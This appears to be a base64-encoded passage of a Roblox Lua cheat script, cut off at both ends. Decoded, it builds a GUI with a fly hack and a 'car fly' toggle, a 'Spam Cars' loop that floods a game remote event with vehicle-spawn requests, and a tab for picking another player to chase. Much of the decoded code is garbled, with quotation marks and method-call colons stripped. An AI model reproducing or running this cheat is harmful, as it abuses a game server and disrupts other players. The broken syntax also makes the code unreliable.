D0gT24KCVN0YXQyLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAyNTUsIDApCglVbmZseS5WaXNpYmxlID0gdHJ1ZQoJRmx5b24uVmlzaWJsZSA9IHRydWUKCWxvY2FsIEJWID0gSW5zdGFuY2UubmV3KEJvZHlWZWxvY2l0eSxIdW1hbm9pZFJQKQoJbG9jYWwgQkcgPSBJbnN0YW5jZS5uZXcoQm9keUd5cm8sSHVtYW5vaWRSUCkKCUJWLk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLG1hdGguaHVnZSxtYXRoLmh1Z2UpCglnYW1lR2V0U2VydmljZSgnUnVuU2VydmljZScpLlJlbmRlclN0ZXBwZWRjb25uZWN0KGZ1bmN0aW9uKCkKCUJHLk1heFRvcnF1ZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSxtYXRoLmh1Z2UsbWF0aC5odWdlKQoJQkcuRCA9IDUwMDAKCUJHLlAgPSAxMDAwMDAKCUJHLkNGcmFtZSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lCgllbmQpCmVuZCkKClNwZWVlZC5OYW1lID0gU3BlZWVkClNwZWVlZC5QYXJlbnQgPSBGbHlGcmFtZQpTcGVlZWQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLCA4MCwgODApClNwZWVlZC5Cb3JkZXJTaXplUGl4ZWwgPSAwClNwZWVlZC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA3NTk0OTM2MzQsIDAsIDAuNDAyODc3Njg4LCAwKQpTcGVlZWQuU2l6ZSA9IFVEaW0yLm5ldygwLCA4NywgMCwgMzIpClNwZWVlZC5aSW5kZXggPSAwClNwZWVlZC5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKU3BlZWVkLlRleHQgPSBTcGVlZApTcGVlZWQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClNwZWVlZC5UZXh0U2NhbGVkID0gdHJ1ZQpTcGVlZWQuVGV4dFNpemUgPSAxNC4wMDAKU3BlZWVkLlRleHRXcmFwcGVkID0gdHJ1ZQoKU3RhdC5OYW1lID0gU3RhdApTdGF0LlBhcmVudCA9IEZseUZyYW1lClN0YXQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLCA4MCwgODApClN0YXQuQm9yZGVyU2l6ZVBpeGVsID0gMApTdGF0LlBvc2l0aW9uID0gVURpbTIubmV3KDAuMjk5OTgzNzk5LCAwLCAwLjIzOTgxNzQ0MSwgMCkKU3RhdC5TaXplID0gVURpbTIubmV3KDAsIDg1LCAwLCAxNSkKU3RhdC5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKU3RhdC5UZXh0ID0gU3RhdHVzClN0YXQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClN0YXQuVGV4dFNjYWxlZCA9IHRydWUKU3RhdC5UZXh0U2l6ZSA9IDE0LjAwMApTdGF0LlRleHRXcmFwcGVkID0gdHJ1ZQoKU3RhdDIuTmFtZSA9IFN0YXQyClN0YXQyLlBhcmVudCA9IEZseUZyYW1lClN0YXQyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig4MCwgODAsIDgwKQpTdGF0Mi5Cb3JkZXJTaXplUGl4ZWwgPSAwClN0YXQyLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNTQ2NTM1MTk0LCAwLCAwLjIzOTgxNzQ0MSwgMCkKU3RhdDIuU2l6ZSA9IFVEaW0yLm5ldygwLCAyNywgMCwgMTUpClN0YXQyLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2FucwpTdGF0Mi5UZXh0ID0gT2ZmClN0YXQyLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApClN0YXQyLlRleHRTY2FsZWQgPSB0cnVlClN0YXQyLlRleHRTaXplID0gMTQuMDAwClN0YXQyLlRleHRXcmFwcGVkID0gdHJ1ZQoKVW5mbHkuTmFtZSA9IFVuZmx5ClVuZmx5LlBhcmVudCA9IEZseUZyYW1lClVuZmx5LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKVW5mbHkuQm9yZGVyU2l6ZVBpeGVsID0gMApVbmZseS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA3NTk0OTM2MzQsIDAsIDAuNzA1Nzk3MDc2LCAwKQpVbmZseS5TaXplID0gVURpbTIubmV3KDAsIDE5OSwgMCwgMzIpClVuZmx5LlZpc2libGUgPSBmYWxzZQpVbmZseS5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKVW5mbHkuVGV4dCA9IERpc2FibGUKVW5mbHkuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClVuZmx5LlRleHRTY2FsZWQgPSB0cnVlClVuZmx5LlRleHRTaXplID0gMTQuMDAwClVuZmx5LlRleHRXcmFwcGVkID0gdHJ1ZQpVbmZseS5Nb3VzZUJ1dHRvbjFDbGlja0Nvbm5lY3QoZnVuY3Rpb24oKQoJbG9jYWwgSHVtYW5vaWRSUCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAoJRmx5LlZpc2libGUgPSB0cnVlCglTdGF0Mi5UZXh0ID0gT2ZmCglTdGF0Mi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKQoJd2FpdCgpCglVbmZseS5WaXNpYmxlID0gZmFsc2UKCUZseW9uLlZpc2libGUgPSBmYWxzZQoJSHVtYW5vaWRSUEZpbmRGaXJzdENoaWxkT2ZDbGFzcyhCb2R5VmVsb2NpdHkpRGVzdHJveSgpCglIdW1hbm9pZFJQRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEJvZHlHeXJvKURlc3Ryb3koKQplbmQpCgpWZmx5Lk5hbWUgPSBWZmx5ClZmbHkuUGFyZW50ID0gRHJhZwpWZmx5LkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKVmZseS5Cb3JkZXJTaXplUGl4ZWwgPSAwClZmbHkuU2l6ZSA9IFVEaW0yLm5ldygwLCA1NywgMCwgMjcpClZmbHkuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zClZmbHkuVGV4dCA9IENhciBmbHkKVmZseS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKVmZseS5UZXh0U2NhbGVkID0gdHJ1ZQpWZmx5LlRleHRTaXplID0gMTQuMDAwClZmbHkuVGV4dFdyYXBwZWQgPSB0cnVlCgpDbG9zZS5OYW1lID0gQ2xvc2UKQ2xvc2UuUGFyZW50ID0gRHJhZwpDbG9zZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMTUwLCAxOTEpCkNsb3NlLkJvcmRlclNpemVQaXhlbCA9IDAKQ2xvc2UuUG9zaXRpb24gPSBVRGltMi5uZXcoMC44NzUsIDAsIDAsIDApCkNsb3NlLlNpemUgPSBVRGltMi5uZXcoMCwgMjcsIDAsIDI3KQpDbG9zZS5Gb250ID0gRW51bS5Gb250LlNvdXJjZVNhbnMKQ2xvc2UuVGV4dCA9IFgKQ2xvc2UuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCkNsb3NlLlRleHRTY2FsZWQgPSB0cnVlCkNsb3NlLlRleHRTaXplID0gMTQuMDAwCkNsb3NlLlRleHRXcmFwcGVkID0gdHJ1ZQpDbG9zZS5Nb3VzZUJ1dHRvbjFDbGlja0Nvbm5lY3QoZnVuY3Rpb24oKQoJRmx5bWd1aXYyRGVzdHJveSgpCmVuZCkKCk1pbmltaXplLk5hbWUgPSBNaW5pbWl6ZQpNaW5pbWl6ZS5QYXJlbnQgPSBEcmFnCk1pbmltaXplLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKTWluaW1pemUuQm9yZGVyU2l6ZVBpeGVsID0gMApNaW5pbWl6ZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjc1LCAwLCAwLCAwKQpNaW5pbWl6ZS5TaXplID0gVURpbTIubmV3KDAsIDI3LCAwLCAyNykKTWluaW1pemUuRm9udCA9IEVudW0uRm9udC5Tb3VyY2VTYW5zCk1pbmltaXplLlRleHQgPSAtCk1pbmltaXplLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpNaW5pbWl6ZS5UZXh0U2NhbGVkID0gdHJ1ZQpNaW5pbWl6ZS5UZXh0U2l6ZSA9IDE0LjAwMApNaW5pbWl6ZS5UZXh0V3JhcHBlZCA9IHRydWUKZnVuY3Rpb24gTWluaSgpCglpZiBNaW5pbWl6ZS5UZXh0ID09IC0gdGhlbgoJCU1pbmltaXplLlRleHQgPSArCgkJRmx5RnJhbWUuVmlzaWJsZSA9IGZhbHNlCgllbHNlaWYgTWluaW1pemUuVGV4dCA9PSArIHRoZW4KCQlNaW5pbWl6ZS5UZXh0ID0gLQoJCUZseUZyYW1lLlZpc2libGUgPSB0cnVlCgllbmQKZW5kCk1pbmltaXplLk1vdXNlQnV0dG9uMUNsaWNrQ29ubmVjdChNaW5pKQoKRmx5b24uTmFtZSA9IEZseSBvbgpGbHlvbi5QYXJlbnQgPSBGbHltZ3VpdjIKRmx5b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCkZseW9uLkJvcmRlclNpemVQaXhlbCA9IDAKRmx5b24uUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xMTc2NDcwNjcsIDAsIDAuNTUwMjg0NjI0LCAwKQpGbHlvbi5TaXplID0gVURpbTIubmV3KDAuMTQ4MDAwMDAyLCAwLCAwLjMxNDk5OTk5OCwgMCkKRmx5b24uVmlzaWJsZSA9IGZhbHNlCkZseW9uLkFjdGl2ZSA9IHRydWUKRmx5b24uRHJhZ2dhYmxlID0gdHJ1ZQoKVy5OYW1lID0gVwpXLlBhcmVudCA9IEZseW9uClcuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDE1MCwgMTkxKQpXLkJvcmRlclNpemVQaXhlbCA9IDAKVy5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEzNDcxOTUyMSwgMCwgMC4wMTUyMDEzMzAyLCAwKQpXLlNpemUgPSBVRGltMi5uZXcoMC43MDg5OTk5OTEsIDAsIDAuNDk5MDAwMDEzLCAwKQpXLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2FucwpXLlRleHQgPSBeClcuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClcuVGV4dFNjYWxlZCA9IHRydWUKVy5UZXh0U2l6ZSA9IDE0LjAwMApXLlRleHRXcmFwcGVkID0gdHJ1ZQpXLlRvdWNoTG9uZ1ByZXNzQ29ubmVjdChmdW5jdGlvbigpCglsb2NhbCBIdW1hbm9pZFJQID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIFNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIDAKZW5kKQoKVy5Nb3VzZUJ1dHRvbjFDbGlja0Nvbm5lY3QoZnVuY3Rpb24oKQoJbG9jYWwgSHVtYW5vaWRSUCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICBTcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICAwCmVuZCkKClMuTmFtZSA9IFMKUy5QYXJlbnQgPSBGbHlvbgpTLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLCAxNTAsIDE5MSkKUy5Cb3JkZXJTaXplUGl4ZWwgPSAwClMuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xMzQwMDAwMDMsIDAsIDAuNDc5OTk5OTg5LCAwKQpTLlJvdGF0aW9uID0gMTgwLjAwMApTLlNpemUgPSBVRGltMi5uZXcoMC43MDg5OTk5OTEsIDAsIDAuNDk5MDAwMDEzLCAwKQpTLkZvbnQgPSBFbnVtLkZvbnQuU291cmNlU2FucwpTLlRleHQgPSBeClMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClMuVGV4dFNjYWxlZCA9IHRydWUKUy5UZXh0U2l6ZSA9IDE0LjAwMApTLlRleHRXcmFwcGVkID0gdHJ1ZQpTLlRvdWNoTG9uZ1ByZXNzQ29ubmVjdChmdW5jdGlvbigpCglsb2NhbCBIdW1hbm9pZFJQID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0CglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAgLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAgLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAgLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICAwCmVuZCkKClMuTW91c2VCdXR0b24xQ2xpY2tDb25uZWN0KGZ1bmN0aW9uKCkKCWxvY2FsIEh1bWFub2lkUlAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAgLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAgLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIC1TcGVlZC5UZXh0Cgl3YWl0KC4xKQoJSHVtYW5vaWRSUC5Cb2R5VmVsb2NpdHkuVmVsb2NpdHkgPSBnYW1lLldvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICAtU3BlZWQuVGV4dAoJd2FpdCguMSkKCUh1bWFub2lkUlAuQm9keVZlbG9jaXR5LlZlbG9jaXR5ID0gZ2FtZS5Xb3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DRnJhbWUuTG9va1ZlY3RvciAgLVNwZWVkLlRleHQKCXdhaXQoLjEpCglIdW1hbm9pZFJQLkJvZHlWZWxvY2l0eS5WZWxvY2l0eSA9IGdhbWUuV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ0ZyYW1lLkxvb2tWZWN0b3IgIDAKZW5kKQogICAgZW5kCn0pCgpDYXJUYWJBZGRQYXJhZ3JhcGgoe05vdGUsIEJ5IGFjdGl2YXRpbmcgdGhpcywgeW91IGNhbiBmbHkgd2l0aCB5b3VyIGNhcn0pCgotLSBTcGFtIENhcnMgU2VjdGlvbgpsb2NhbCBTcGFtQ2FyU2VjdGlvbiA9IENhclRhYkFkZFNlY3Rpb24oe1NwYW0gQ2FyfSkKCmxvY2FsIGNhckxpc3QgPSB7CiAgICBTY2hvb2xCdXMsIFNtYXJ0Q2FyLCBGYXJtVHJ1Y2ssIENhZGlsbGFjLCBFeGNhdmF0b3IsCiAgICBKZWVwLCBOYXNjYXJUcnVjaywgVG93VHJ1Y2ssIFNub3dwbG93LCBNaWxpdGFyeVRydWNrLAogICAgVGFuaywgTGltbywgRmlyZVRydWNrCn0KCmxvY2FsIHNwYW1DYXJzQWN0aXZlID0gZmFsc2UKCmxvY2FsIGZ1bmN0aW9uIHNwYXduQ2FyKGNhck5hbWUpCiAgICBsb2NhbCBhcmdzID0gewogICAgICAgIFsxXSA9IFBpY2tpbmdDYXIsCiAgICAgICAgWzJdID0gY2FyTmFtZQogICAgfQogICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpV2FpdEZvckNoaWxkKFJFKVdhaXRGb3JDaGlsZCgxQ2ExcilGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKZW5kCgpDYXJUYWJBZGRUb2dnbGUoewogICAgTmFtZSA9IFNwYW0gQ2FycywKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCiAgICAgICAgc3BhbUNhcnNBY3RpdmUgPSBzdGF0ZQogICAgICAgIGlmIHNwYW1DYXJzQWN0aXZlIHRoZW4KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBzcGFtQ2Fyc0FjdGl2ZSBkbwogICAgICAgICAgICAgICAgICAgIGZvciBfLCBjYXJOYW1lIGluIGlwYWlycyhjYXJMaXN0KSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc3BhbUNhcnNBY3RpdmUgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgc3Bhd25DYXIoY2FyTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgwLjQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpDYXJUYWJBZGRQYXJhZ3JhcGgoe0luZm9ybWF0aW9uLCBTcGFtIG11bHRpcGxlIGNhcnN9KQoKCgotLSBHbG9iYWwgdmFyaWFibGVzCmxvY2FsIHBsID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIHBsYXllcnMgPSB7fQoKLS0gRnVuY3Rpb24gdG8gdXBkYXRlIHRoZSBwbGF5ZXIgbGlzdApsb2NhbCBmdW5jdGlvbiB1cGRhdGVQbGF5ZXJMaXN0KCkKICAgIHBsYXllcnMgPSB7fQogICAgZm9yIF8sIHBsYXllciBpbiBwYWlycyhnYW1lLlBsYXllcnNHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgdGFibGUuaW5zZXJ0KHBsYXllcnMsIHBsYXllci5OYW1lKQogICAgZW5kCiAgICByZXR1cm4gcGxheWVycwplbmQKCi0tIEluaXRpYWxpemVzIHRoZSBwbGF5ZXIgbGlzdAp1cGRhdGVQbGF5ZXJMaXN0KCkKCi0tIENoaWxkIFRhYgpsb2NhbCBDaGlsZFRhYiA9IFdpbmRvd01ha2VUYWIoe0NoaWxkLCBiYWJ5fSkKCmxvY2FsIFNlY3Rpb24gPSBDaGlsZFRhYkFkZFNlY3Rpb24oewogICAgTmFtZSA9IENoaWxkCn0pCgpsb2NhbCBjaGFzaW5ncGxheWVyID0gbmlsCmxvY2FsIHBsYXllckNoaWxkID0gQ2hpbGRUYWJBZGREcm9wZG93bih7CiAgICBOYW1lID0gU2VsZWN0IGEgcGxheWVyIHRvIGNoYXNlLAogICAgT3B0aW9ucyA9IHBsYXllcnMsCiAgICBEZWZhdWx0ID0gLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZCkKICAgICAgICBpZiBnYW1lLlBsYXllcnNGaW5kRmlyc3RDaGlsZChzZWxlY3RlZCkgdGhlbgogICAgICAgICA